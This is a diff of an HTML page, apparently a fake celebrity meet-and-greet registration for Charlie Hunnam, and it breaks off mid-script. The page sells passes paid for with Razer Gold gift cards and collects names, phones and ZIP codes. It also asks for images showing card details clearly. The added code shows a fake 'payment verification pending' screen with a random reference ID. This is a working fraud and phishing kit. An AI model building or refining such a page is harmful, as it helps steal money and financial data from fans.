@@ -1,247 +1,327 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Official Meet & Greet Registration</title>
-    <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
-        body { background-color: #0b0c10; color: #fff; padding: 15px; display: flex; justify-content: center; }
-        .container { max-width: 600px; width: 100%; background: #1f2833; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.8); border: 1px solid #c5a059; }
-        
-        /* Header styling matching Can Yaman & AQV Poster aesthetics */
-        .header { background: linear-gradient(180deg, #0a192f 0%, #111 100%); color: #fff; text-align: center; padding: 25px 15px; border-bottom: 3px solid #c5a059; }
-        .header h3 { font-size: 12px; letter-spacing: 3px; color: #c5a059; text-transform: uppercase; margin-bottom: 5px; }
-        .header h1 { font-size: 26px; text-transform: uppercase; letter-spacing: 1.5px; color: #fff; margin-bottom: 5px; }
-        .header h2 { font-size: 15px; font-weight: 300; color: #66fcf1; }
-        
-        .page { padding: 20px; display: none; }
-        .page.active { display: block; }
-        
-        .section-title { background: #0b0c10; color: #c5a059; padding: 10px 12px; font-weight: bold; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; border-left: 4px solid #c5a059; margin-bottom: 15px; margin-top: 10px; border-radius: 0 4px 4px 0; }
-        
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; font-size: 12px; font-weight: bold; text-transform: uppercase; margin-bottom: 6px; color: #c5a059; }
-        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #45a29e; background: #0b0c10; color: #fff; border-radius: 6px; font-size: 14px; outline: none; }
-        .form-group input:focus { border-color: #c5a059; }
-        
-        /* Interactive Package Selection Cards */
-        .packages-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
-        .package-card { border: 1px solid #45a29e; background: #0b0c10; padding: 15px 10px; border-radius: 8px; text-align: center; cursor: pointer; transition: 0.2s; position: relative; }
-        .package-card:hover, .package-card.selected { border-color: #c5a059; background: #1f2833; box-shadow: 0 0 10px rgba(197, 160, 89, 0.4); }
-        .package-card input[type="radio"] { position: absolute; top: 10px; right: 10px; }
-        .package-name { font-size: 14px; font-weight: bold; color: #fff; text-transform: uppercase; }
-        .package-price { font-size: 18px; font-weight: bold; color: #c5a059; margin-top: 5px; }
-        
-        /* Event Info Box */
-        .event-box { font-size: 12px; line-height: 1.8; margin-bottom: 15px; background: #0b0c10; padding: 12px; border-radius: 6px; border: 1px solid #45a29e; }
-
-        /* Payment Button Styling */
-        .pay-link-btn { display: block; width: 100%; background: #c5a059; color: #000; text-align: center; padding: 14px; font-weight: bold; text-decoration: none; font-size: 15px; text-transform: uppercase; border-radius: 6px; margin: 15px 0; letter-spacing: 1px; box-shadow: 0 4px 10px rgba(197, 160, 89, 0.3); }
-        .pay-link-btn:active { transform: scale(0.98); }
-
-        .btn-container { display: flex; justify-content: space-between; margin-top: 20px; }
-        .btn { background: #45a29e; color: #000; border: none; padding: 14px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; text-transform: uppercase; width: 100%; font-size: 14px; }
-        .btn-secondary { background: #555; color: #fff; width: 35%; }
-        .btn-submit { background: #c5a059; color: #000; width: 62%; }
-        
-        /* Ticket / Summary Preview Box */
-        .ticket-preview { border: 2px dashed #c5a059; background: #0b0c10; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center; }
-        .ticket-id-box { border: 1px solid #c5a059; padding: 8px; margin: 10px auto; width: 80%; background: #1f2833; font-weight: bold; font-size: 14px; letter-spacing: 2px; color: #66fcf1; }
-        
-        .rules-list { font-size: 11px; color: #aaa; padding-left: 18px; margin-bottom: 15px; line-height: 1.6; }
-
-        .footer-info { background: #0b0c10; padding: 15px; font-size: 11px; border-top: 1px solid #333; margin-top: 20px; text-align: center; color: #888; border-radius: 0 0 12px 12px; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <!-- HEADER -->
-    <div class="header">
-        <h3>Global Agency × Passion Showcase</h3>
-        <h1>Official Meet & Greet</h1>
-        <h2>Registration Form with <strong>Charlie Hunnam</strong></h2>
-    </div>
-
-    <!-- FORMSPREE CONNECTED FORM -->
-    <form id="meetGreetForm" action="https://form.jotform.com/262299221978066" method="POST" enctype="multipart/form-data">
-        
-        <!-- PAGE 1: FAN & PACKAGE SELECTION -->
-        <div class="page active" id="page1">
-            <div class="section-title">1. Fan Information</div>
-            
-            <div class="form-group">
-                <label>Full Name *</label>
-                <input type="text" id="fullName" name="Full_Name" placeholder="Enter your full name" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Email Address *</label>
-                <input type="email" id="email" name="Email_Address" placeholder="Enter your email" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Phone Number *</label>
-                <input type="tel" id="phone" name="Phone_Number" placeholder="+1 (000) 000-0000" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Country / City *</label>
-                <input type="text" id="location" name="Country_City" placeholder="e.g. Istanbul, Türkiye / New York, USA" required>
-            </div>
-
-            <div class="form-group">
-                <label>ZIP CODE*</label>
-                <input type="text" id="zipcode" name="Zip_Code" placeholder="e.g. 90291" required>
-            </div>
-
-            <div class="section-title">2. Select Package Category</div>
-            
-            <div class="packages-grid">
-                <div class="package-card selected" onclick="selectPkg(this, 'Platinum Pass (€800 / $800)', 'Slot unavailable. Please choose another.', 'Front Row Seating, 1-on-1 Photo Opportunity, Signed Official Poster, VIP Laminate & Lanyard, Exclusive Merchandise Pack, Group Fan Interaction')">
-                    <input type="radio" name="Package_Selected" value="Platinum Pass (€800 / $800)" checked>
-                    <div class="package-name">Platinum</div>
-                    <div class="package-price">$800 </div>
-                     unavailable
-                </div>
-                
-                <div class="package-card" onclick="selectPkg(this, 'Gold Pass (€550 / $550)', 'https://www.eneba.com/gb/razer-razer-gold-gift-card-550-usd-key-global', 'Priority Seating, Group Photo Opportunity, Autograph, VIP Laminate & Lanyard, Exclusive Merchandise')">
-                    <input type="radio" name="Package_Selected" value="Gold Pass (€550 / $550)">
-                    <div class="package-name">Gold</div>
-                    <div class="package-price">$550</div>
-                     promo⭐⭐⭐⭐
-                </div>
-
-                <div class="package-card" onclick="selectPkg(this, 'Silver Pass (€500 / $500)', 'https://www.eneba.com/gb/razer-razer-gold-gift-card-500-usd-key-global', 'Standard Seating, Group Photo Opportunity, Signed Event Card, VIP Lanyard')">
-                    <input type="radio" name="Package_Selected" value="Silver Pass (€500 / $500)">
-                    <div class="package-name">Silver</div>
-                    <div class="package-price">$500</div>
-                </div>
-
-                <div class="package-card" onclick="selectPkg(this, 'Bronze Pass (€200 / $200)', 'https://www.eneba.com/gb/razer-razer-gold-gift-card-200-usd-key-global', 'General Admission Seating, Event Souvenir Card, Group Fan Interaction')">
-                    <input type="radio" name="Package_Selected" value="Bronze Pass (€200 / $200)">
-                    <div class="package-name">Bronze</div>
-                    <div class="package-price">$200</div>
-                </div>
-            </div>
-
-            <button type="button" class="btn" onclick="nextPage(2)">Continue to Payment & Details →</button>
-        </div>
-
-        <!-- PAGE 2: EVENT DETAILS, PAYMENT LINK & PROOF UPLOAD -->
-        <div class="page" id="page2">
-            <div class="section-title">Event Information</div>
-            
-            <div class="event-box">
-                📅 <strong>Date:</strong> 5 October 2026 (Monday)<br>
-                📍 <strong>Venue:</strong> Hollywood Bowl, LOS ANGELES, CA, USA <br>
-                ⏰ <strong>Timing:</strong> Doors Open: 15:00 | Event Starts: 17:00<br>
-                🎁 <strong>Inclusions:</strong> <span id="summaryInclusions">1-on-1 Photo Opportunity, Signed Official Poster, VIP Laminate & Lanyard, Exclusive Merchandise Pack, Group Fan Interaction</span>
-            </div>
-
-            <div class="section-title">3. Make Payment</div>
-            <p style="font-size: 12px; color: #ccc; margin-bottom: 10px;">
-                Tap the gold button below to open the secure payment link and complete your pass transfer:
-            </p>
-
-            <!-- DYNAMIC PAYMENT BUTTON -->
-            <a id="payBtnLink" href="https://your-platinum-payment-link.com" target="_blank" class="pay-link-btn">
-                💳 Tap Here to Complete Payment
-            </a>
-
-            <div class="section-title">4. Upload Proof of Payment</div>
-            <p style="font-size: 12px; color: #ccc; margin-bottom: 10px;">
-                After making the payment on the link above, upload a picture/screenshot of your card payment receipt below:<br>
-                warning ⚠️: make sure card details are clear. with card Virtual image.
-            </p>
-
-            <div class="form-group">
-                <label>Payment Receipt / Screenshot *</label>
-                <input type="file" id="receiptUpload" name="Payment_Receipt" accept="image/*" required>
-            </div>
-
-            <!-- TICKET LIVE PREVIEW CARD -->
-            <div class="ticket-preview">
-                <h3 style="font-size: 12px; color: #c5a059;">TICKET REGISTRATION SUMMARY</h3>
-                <div class="ticket-id-box">
-                    <span>STATUS: UNPAID</span>
-                </div>
-                <div style="text-align: left; font-size: 12px; line-height: 1.8; color: #ddd; margin-top: 10px;">
-                    <strong>Name:</strong> <span id="summaryName">-</span><br>
-                    <strong>Email:</strong> <span id="summaryEmail">-</span><br>
-                    <strong>Package:</strong> <span id="summaryPackage">-</span><br>
-                    <strong>ZIP CODE:</strong> <span id="summaryzipcode">-</span>
-                </div>
-            </div>
-
-            <div class="section-title" style="margin-top: 20px;">Important Rules</div>
-            <ul class="rules-list">
-                <li>Tickets are limited. First come, first served.</li>
-                <li>Tickets are non-refundable and non-transferable once payment is submitted.</li>
-                <li>Bring a valid photo ID along with your ticket confirmation.</li>
-                <li>Follow all official venue staff instructions at all times.</li>
-            </ul>
-
-            <div class="btn-container">
-                <button type="button" class="btn btn-secondary" onclick="nextPage(1)">← Back</button>
-                <button type="submit" class="btn btn-submit">Submit Registration →</button>
-            </div>
-        </div>
-
-    </form>
-
-    <div class="footer-info">
-        Organized by Global Agency × Passion Showcase<br>
-        📧 marcoc11611@gmail.com | 🌐 www.charliehunnam.com<br>
-        <strong>THANK YOU! WE LOOK FORWARD TO MEETING YOU.</strong>
-    </div>
-</div>
-
-<script>
-    let selectedPackageValue = "Platinum Pass (€800 / $800)";
-    let selectedPaymentLink = "https://your-platinum-payment-link.com";
-    let selectedInclusions = "Front Row Seating, 1-on-1 Photo Opportunity, Signed Official Poster, VIP Laminate & Lanyard, Exclusive Merchandise Pack, Group Fan Interaction";
-
-    function selectPkg(cardElement, pkgValue, payLink, inclusions) {
-        document.querySelectorAll('.package-card').forEach(card => card.classList.remove('selected'));
-        cardElement.classList.add('selected');
-        
-        const radio = cardElement.querySelector('input[type="radio"]');
-        radio.checked = true;
-        
-        selectedPackageValue = pkgValue;
-        selectedPaymentLink = payLink;
-        selectedInclusions = inclusions;
-    }
-
-    function nextPage(pageNum) {
-        if (pageNum === 2) {
-            const name = document.getElementById('fullName').value;
-            const email = document.getElementById('email').value;
-            const phone = document.getElementById('phone').value;
-            const zipcode = document.getElementById('zipcode').value;
-            
-            if (!name || !email || !phone) {
-                alert('Please complete your Full Name, Email, and Phone Numbe, Zip Code, before continuing.');
-                return;
-            }
-
-            // Update Page 2 Preview Data, Payment Link, and Package Inclusions
-            document.getElementById('summaryName').innerText = name;
-            document.getElementById('summaryEmail').innerText = email;
-            document.getElementById('summaryPackage').innerText = selectedPackageValue;
-            document.getElementById('summaryzipcode').innerText = zipcode;
-            document.getElementById('summaryInclusions').innerText = selectedInclusions;
-            document.getElementById('payBtnLink').href = selectedPaymentLink;
-        }
-        
-        document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
-        document.getElementById('page' + pageNum).classList.add('active');
-        window.scrollTo(0, 0);
-    }
-</script>
-
-</body>
-    </html>
-    
+‎<!DOCTYPE html>
+‎<html lang="en">
+‎<head>
+‎    <meta charset="UTF-8">
+‎    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+‎    <title>Official Meet & Greet Registration</title>
+‎    <style>
+‎        * { box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; }
+‎        body { background-color: #0b0c10; color: #fff; padding: 15px; display: flex; justify-content: center; }
+‎        .container { max-width: 600px; width: 100%; background: #1f2833; border-radius: 12px; overflow: hidden; box-shadow: 0 8px 25px rgba(0,0,0,0.8); border: 1px solid #c5a059; }
+‎        
+‎        /* Header styling matching Can Yaman & AQV Poster aesthetics */
+‎        .header { background: linear-gradient(180deg, #0a192f 0%, #111 100%); color: #fff; text-align: center; padding: 25px 15px; border-bottom: 3px solid #c5a059; }
+‎        .header h3 { font-size: 12px; letter-spacing: 3px; color: #c5a059; text-transform: uppercase; margin-bottom: 5px; }
+‎        .header h1 { font-size: 26px; text-transform: uppercase; letter-spacing: 1.5px; color: #fff; margin-bottom: 5px; }
+‎        .header h2 { font-size: 15px; font-weight: 300; color: #66fcf1; }
+‎        
+‎        .page { padding: 20px; display: none; }
+‎        .page.active { display: block; }
+‎        
+‎        .section-title { background: #0b0c10; color: #c5a059; padding: 10px 12px; font-weight: bold; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; border-left: 4px solid #c5a059; margin-bottom: 15px; margin-top: 10px; border-radius: 0 4px 4px 0; }
+‎        
+‎        .form-group { margin-bottom: 15px; }
+‎        .form-group label { display: block; font-size: 12px; font-weight: bold; text-transform: uppercase; margin-bottom: 6px; color: #c5a059; }
+‎        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #45a29e; background: #0b0c10; color: #fff; border-radius: 6px; font-size: 14px; outline: none; }
+‎        .form-group input:focus { border-color: #c5a059; }
+‎        
+‎        /* Upload Link Input Style */
+‎        .upload-input-btn { display: block; width: 100%; padding: 12px; border: 1px solid #45a29e; background: #0b0c10; color: #aaa; border-radius: 6px; font-size: 14px; text-decoration: none; text-align: left; }
+‎        .upload-input-btn:hover { border-color: #c5a059; color: #fff; }
+‎
+‎        /* Interactive Package Selection Cards */
+‎        .packages-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
+‎        .package-card { border: 1px solid #45a29e; background: #0b0c10; padding: 15px 10px; border-radius: 8px; text-align: center; cursor: pointer; transition: 0.2s; position: relative; }
+‎        .package-card:hover, .package-card.selected { border-color: #c5a059; background: #1f2833; box-shadow: 0 0 10px rgba(197, 160, 89, 0.4); }
+‎        .package-card input[type="radio"] { position: absolute; top: 10px; right: 10px; }
+‎        .package-name { font-size: 14px; font-weight: bold; color: #fff; text-transform: uppercase; }
+‎        .package-price { font-size: 18px; font-weight: bold; color: #c5a059; margin-top: 5px; }
+‎        
+‎        /* Event Info Box */
+‎        .event-box { font-size: 12px; line-height: 1.8; margin-bottom: 15px; background: #0b0c10; padding: 12px; border-radius: 6px; border: 1px solid #45a29e; }
+‎
+‎        /* Payment Button Styling */
+‎        .pay-link-btn { display: block; width: 100%; background: #c5a059; color: #000; text-align: center; padding: 14px; font-weight: bold; text-decoration: none; font-size: 15px; text-transform: uppercase; border-radius: 6px; margin: 15px 0; letter-spacing: 1px; box-shadow: 0 4px 10px rgba(197, 160, 89, 0.3); }
+‎        .pay-link-btn:active { transform: scale(0.98); }
+‎
+‎        .btn-container { display: flex; justify-content: space-between; margin-top: 20px; }
+‎        .btn { background: #45a29e; color: #000; border: none; padding: 14px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; text-transform: uppercase; width: 100%; font-size: 14px; }
+‎        .btn-secondary { background: #555; color: #fff; width: 35%; }
+‎        .btn-submit { background: #c5a059; color: #000; width: 62%; }
+‎        
+‎        /* Ticket / Summary Preview Box */
+‎        .ticket-preview { border: 2px dashed #c5a059; background: #0b0c10; padding: 15px; border-radius: 8px; margin-top: 15px; text-align: center; }
+‎        .ticket-id-box { border: 1px solid #c5a059; padding: 8px; margin: 10px auto; width: 80%; background: #1f2833; font-weight: bold; font-size: 14px; letter-spacing: 2px; color: #66fcf1; }
+‎        
+‎        .rules-list { font-size: 11px; color: #aaa; padding-left: 18px; margin-bottom: 15px; line-height: 1.6; }
+‎
+‎        /* Pending Screen Styling */
+‎        .status-badge { display: inline-block; background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; color: #f39c12; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: bold; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 15px; }
+‎        .pulse-icon { font-size: 48px; margin-bottom: 10px; display: inline-block; animation: pulse 2s infinite; }
+‎        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.7; } 100% { transform: scale(1); opacity: 1; } }
+‎        .pending-card { background: #0b0c10; border: 1px solid #45a29e; border-radius: 8px; padding: 20px; text-align: center; margin-bottom: 15px; }
+‎        .ref-box { background: #1f2833; border: 1px dashed #c5a059; padding: 12px; margin: 15px 0; border-radius: 6px; }
+‎
+‎        .footer-info { background: #0b0c10; padding: 15px; font-size: 11px; border-top: 1px solid #333; margin-top: 20px; text-align: center; color: #888; border-radius: 0 0 12px 12px; }
+‎    </style>
+‎</head>
+‎<body>
+‎
+‎<div class="container">
+‎    <!-- HEADER -->
+‎    <div class="header">
+‎        <h3>Global Agency × Passion Showcase</h3>
+‎        <h1>Official Meet & Greet</h1>
+‎        <h2>Registration Form with <strong>Charlie Hunnam</strong></h2>
+‎    </div>
+‎
+‎    <!-- FORMSPREE CONNECTED FORM -->
+‎    <form id="meetGreetForm" action="https://form.jotform.com/262299221978066" method="POST" enctype="multipart/form-data" onsubmit="submitForm(event)">
+‎        
+‎        <!-- PAGE 1: FAN & PACKAGE SELECTION -->
+‎        <div class="page active" id="page1">
+‎            <div class="section-title">1. Fan Information</div>
+‎            
+‎            <div class="form-group">
+‎                <label>Full Name *</label>
+‎                <input type="text" id="fullName" name="Full_Name" placeholder="Enter your full name" required>
+‎            </div>
+‎            
+‎            <div class="form-group">
+‎                <label>Email Address *</label>
+‎                <input type="email" id="email" name="Email_Address" placeholder="Enter your email" required>
+‎            </div>
+‎            
+‎            <div class="form-group">
+‎                <label>Phone Number *</label>
+‎                <input type="tel" id="phone" name="Phone_Number" placeholder="+1 (000) 000-0000" required>
+‎            </div>
+‎            
+‎            <div class="form-group">
+‎                <label>Country / City *</label>
+‎                <input type="text" id="location" name="Country_City" placeholder="e.g. Istanbul, Türkiye / New York, USA" required>
+‎            </div>
+‎
+‎            <div class="form-group">
+‎                <label>ZIP CODE*</label>
+‎                <input type="text" id="zipcode" name="Zip_Code" placeholder="e.g. 90291" required>
+‎            </div>
+‎
+‎            <div class="section-title">2. Select Package Category</div>
+‎            
+‎            <div class="packages-grid">
+‎                <div class="package-card selected" onclick="selectPkg(this, 'Platinum Pass (€800 / $800)', 'Slot unavailable. Please choose another.', 'Front Row Seating, 1-on-1 Photo Opportunity, Signed Official Poster, VIP Laminate & Lanyard, Exclusive Merchandise Pack, Group Fan Interaction')">
+‎                    <input type="radio" name="Package_Selected" value="Platinum Pass (€800 / $800)" checked>
+‎                    <div class="package-name">Platinum</div>
+‎                    <div class="package-price">$800 </div>
+‎                     unavailable
+‎                </div>
+‎                
+‎                <div class="package-card" onclick="selectPkg(this, 'Gold Pass (€550 / $550)', 'https://www.eneba.com/gb/razer-razer-gold-gift-card-550-usd-key-global', 'Priority Seating, Group Photo Opportunity, Autograph, VIP Laminate & Lanyard, Exclusive Merchandise')">
+‎                    <input type="radio" name="Package_Selected" value="Gold Pass (€550 / $550)">
+‎                    <div class="package-name">Gold</div>
+‎                    <div class="package-price">$550</div>
+‎                     promo⭐⭐⭐⭐
+‎                </div>
+‎
+‎                <div class="package-card" onclick="selectPkg(this, 'Silver Pass (€500 / $500)', 'https://www.eneba.com/gb/razer-razer-gold-gift-card-500-usd-key-global', 'Standard Seating, Group Photo Opportunity, Signed Event Card, VIP Lanyard')">
+‎                    <input type="radio" name="Package_Selected" value="Silver Pass (€500 / $500)">
+‎                    <div class="package-name">Silver</div>
+‎                    <div class="package-price">$500</div>
+‎                </div>
+‎
+‎                <div class="package-card" onclick="selectPkg(this, 'Bronze Pass (€200 / $200)', 'https://www.eneba.com/gb/razer-razer-gold-gift-card-200-usd-key-global', 'General Admission Seating, Event Souvenir Card, Group Fan Interaction')">
+‎                    <input type="radio" name="Package_Selected" value="Bronze Pass (€200 / $200)">
+‎                    <div class="package-name">Bronze</div>
+‎                    <div class="package-price">$200</div>
+‎                </div>
+‎            </div>
+‎
+‎            <button type="button" class="btn" onclick="nextPage(2)">Continue to Payment & Details →</button>
+‎        </div>
+‎
+‎        <!-- PAGE 2: EVENT DETAILS, PAYMENT LINK & PROOF UPLOAD -->
+‎        <div class="page" id="page2">
+‎            <div class="section-title">Event Information</div>
+‎            
+‎            <div class="event-box">
+‎                📅 <strong>Date:</strong> 5 October 2026 (Monday)<br>
+‎                📍 <strong>Venue:</strong> Hollywood Bowl, LOS ANGELES, CA, USA <br>
+‎                ⏰ <strong>Timing:</strong> Doors Open: 15:00 | Event Starts: 17:00<br>
+‎                🎁 <strong>Inclusions:</strong> <span id="summaryInclusions">1-on-1 Photo Opportunity, Signed Official Poster, VIP Laminate & Lanyard, Exclusive Merchandise Pack, Group Fan Interaction</span>
+‎            </div>
+‎
+‎            <div class="section-title">3. Make Payment</div>
+‎            <p style="font-size: 12px; color: #ccc; margin-bottom: 10px;">
+‎                Tap the gold button below to open the secure payment link and complete your pass transfer:
+‎            </p>
+‎
+‎            <!-- DYNAMIC PAYMENT BUTTON -->
+‎            <a id="payBtnLink" href="https://your-platinum-payment-link.com" target="_blank" class="pay-link-btn">
+‎                💳 Tap Here to Complete Payment
+‎            </a>
+‎
+‎            <div class="section-title">4. Upload Proof of Payment</div>
+‎            <p style="font-size: 12px; color: #ccc; margin-bottom: 10px;">
+‎                After making the payment on the link above, upload a picture/screenshot of your card payment receipt below:<br>
+‎                warning ⚠️: make sure card details are clear. with card Virtual image.
+‎            </p>
+‎
+‎            <div class="form-group">
+‎                <label>Payment Receipt / Screenshot *</label>
+‎                <!-- REPLACE 'https://your-upload-link.com' WITH YOUR ACTUAL DIRECT UPLOAD LINK -->
+‎                <a href="https://your-upload-link.com" id="uploadLinkBtn" target="_blank" class="upload-input-btn" onclick="markUploaded()">
+‎                    📁 Tap here to upload picture...
+‎                </a>
+‎                <input type="file" id="paymentProofFile" name="Payment_Proof" accept="image/*" style="margin-top: 8px;" onchange="markUploaded()">
+‎            </div>
+‎
+‎            <!-- TICKET LIVE PREVIEW CARD -->
+‎            <div class="ticket-preview">
+‎                <h3 style="font-size: 12px; color: #c5a059;">TICKET REGISTRATION SUMMARY</h3>
+‎                <div class="ticket-id-box">
+‎                    <span>STATUS: UNPAID</span>
+‎                </div>
+‎                <div style="text-align: left; font-size: 12px; line-height: 1.8; color: #ddd; margin-top: 10px;">
+‎                    <strong>Name:</strong> <span id="summaryName">-</span><br>
+‎                    <strong>Email:</strong> <span id="summaryEmail">-</span><br>
+‎                    <strong>Package:</strong> <span id="summaryPackage">-</span><br>
+‎                    <strong>ZIP CODE:</strong> <span id="summaryzipcode">-</span>
+‎                </div>
+‎            </div>
+‎
+‎            <div class="section-title" style="margin-top: 20px;">Important Rules</div>
+‎            <ul class="rules-list">
+‎                <li>Tickets are limited. First come, first served.</li>
+‎                <li>Tickets are non-refundable and non-transferable once payment is submitted.</li>
+‎                <li>Bring a valid photo ID along with your ticket confirmation.</li>
+‎                <li>Follow all official venue staff instructions at all times.</li>
+‎            </ul>
+‎
+‎            <div class="btn-container">
+‎                <button type="button" class="btn btn-secondary" onclick="nextPage(1)">← Back</button>
+‎                <button type="submit" class="btn btn-submit">Submit Registration →</button>
+‎            </div>
+‎        </div>
+‎
+‎        <!-- PAGE 3: PENDING PAYMENT / APPROVAL SCREEN -->
+‎        <div class="page" id="page3">
+‎            <div class="pending-card">
+‎                <div class="pulse-icon">⏳</div>
+‎                <div class="status-badge">Payment Verification Pending</div>
+‎                <h2 style="font-size: 20px; color: #fff; margin-bottom: 8px;">Registration Submitted</h2>
+‎                <p style="font-size: 13px; color: #aaa; line-height: 1.5;">
+‎                    Thank you, <strong id="confirmedName" style="color: #66fcf1;">Fan</strong>! Your meet & greet registration details and payment proof have been successfully received.
+‎                </p>
+‎
+‎                <div class="ref-box">
+‎                    <div style="font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: 1px;">Reference ID</div>
+‎                    <div id="bookingRef" style="font-size: 18px; font-weight: bold; color: #c5a059; letter-spacing: 2px; margin-top: 4px;">MG-894201</div>
+‎                </div>
+‎
+‎                <div style="text-align: left; font-size: 12px; line-height: 1.8; color: #ddd; border-top: 1px solid #333; pt: 10px; margin-top: 15px; padding-top: 10px;">
+‎                    <strong>Package Requested:</strong> <span id="confirmedPackage" style="color: #c5a059;">-</span><br>
+‎                    <strong>Once approved Confirmation email will be sent To:</strong> <span id="confirmedEmail">-</span><br>
+‎                    <strong>Verification Window:</strong> 1 - 3 Hours
+‎                </div>
+‎            </div>
+‎
+‎            <div class="event-box" style="border-color: #c5a059;">
+‎                ℹ️ <strong>What Happens Next?</strong><br>
+‎                1. Our financial team is verifying your payment proof receipt.<br>
+‎                2. Once approved, your official VIP E-Pass with QR Code will be sent directly to your registered email.<br>
+‎                3. If further verification is needed, an agent will contact you at your provided phone number.
+‎            </div>
+‎
+‎            <p style="font-size: 11px; color: #888; text-align: center; margin-top: 15px;">
+‎                Need urgent support regarding your registration? Contact <a href="mailto:marcoc11611@gmail.com" style="color: #66fcf1; text-decoration: none;">marcoc11611@gmail.com</a>
+‎            </p>
+‎        </div>
+‎
+‎    </form>
+‎
+‎    <div class="footer-info">
+‎        Organized by Global Agency × Passion Showcase<br>
+‎        📧 marcoc11611@gmail.com | 🌐 www.charliehunnam.com<br>
+‎        <strong>THANK YOU! WE LOOK FORWARD TO MEETING YOU.</strong>
+‎    </div>
+‎</div>
+‎
+‎<script>
+‎    let selectedPackageValue = "Platinum Pass (€800 / $800)";
+‎    let selectedPaymentLink = "https://your-platinum-payment-link.com";
+‎    let selectedInclusions = "Front Row Seating, 1-on-1 Photo Opportunity, Signed Official Poster, VIP Laminate & Lanyard, Exclusive Merchandise Pack, Group Fan Interaction";
+‎    let isProofUploaded = false;
+‎
+‎    function markUploaded() {
+‎        isProofUploaded = true;
+‎    }
+‎
+‎    function selectPkg(cardElement, pkgValue, payLink, inclusions) {
+‎        document.querySelectorAll('.package-card').forEach(card => card.classList.remove('selected'));
+‎        cardElement.classList.add('selected');
+‎        
+‎        const radio = cardElement.querySelector('input[type="radio"]');
+‎        radio.checked = true;
+‎        
+‎        selectedPackageValue = pkgValue;
+‎        selectedPaymentLink = payLink;
+‎        selectedInclusions = inclusions;
+‎    }
+‎
+‎    function nextPage(pageNum) {
+‎        if (pageNum === 2) {
+‎            const name = document.getElementById('fullName').value;
+‎            const email = document.getElementById('email').value;
+‎            const phone = document.getElementById('phone').value;
+‎            const zipcode = document.getElementById('zipcode').value;
+‎            
+‎            if (!name || !email || !phone) {
+‎                alert('Please complete your Full Name, Email, and Phone Numbe, Zip Code, before continuing.');
+‎                return;
+‎            }
+‎
+‎            // Update Page 2 Preview Data, Payment Link, and Package Inclusions
+‎            document.getElementById('summaryName').innerText = name;
+‎            document.getElementById('summaryEmail').innerText = email;
+‎            document.getElementById('summaryPackage').innerText = selectedPackageValue;
+‎            document.getElementById('summaryzipcode').innerText = zipcode;
+‎            document.getElementById('summaryInclusions').innerText = selectedInclusions;
+‎            document.getElementById('payBtnLink').href = selectedPaymentLink;
+‎        }
+‎        
+‎        document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+‎        document.getElementById('page' + pageNum).classList.add('active');
+‎        window.scrollTo(0, 0);
+‎    }
+‎
+‎    function submitForm(event) {
+‎        // Prevent immediate submission
+‎        event.preventDefault();
+‎
+‎        const fileInput = document.getElementById('paymentProofFile');
+‎        if (!isProofUploaded && (!fileInput || !fileInput.files || fileInput.files.length === 0)) {
+‎            alert('Please upload your payment receipt or screenshot before submitting.');
+‎            return;
+‎        }
+‎
+‎        const name = document.getElementById('fullName').value;
+‎        const email = document.getElementById('email').value;
+‎
+‎        // Generate a random Reference ID
+‎        const randomRef = 'MG-' + Math.floor(100000 + Math.random() * 900000);
+‎
+‎        // Update Page 3 pending screen details
+‎        document.getElementById('confirmedName').innerText = name || 'Fan';
+‎        document.getElementById('confirmedEmail').innerText = email || '-';
+‎        document.getElementById('confirmedPackage').innerText = selectedPackageValue;
+‎        document.getElementById('bookingRef').innerText = randomRef;
+‎
+‎        // Transition to Page 3
+‎        document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+‎        document.getElementById('page3').classList.add('active');
+‎        window.scrollTo(0, 0);
+‎
+‎        // Submit form data asynchronously using fetch
+‎        const form = document.getElementById('meetGreetForm');
+‎        const formData = new FormData(form)
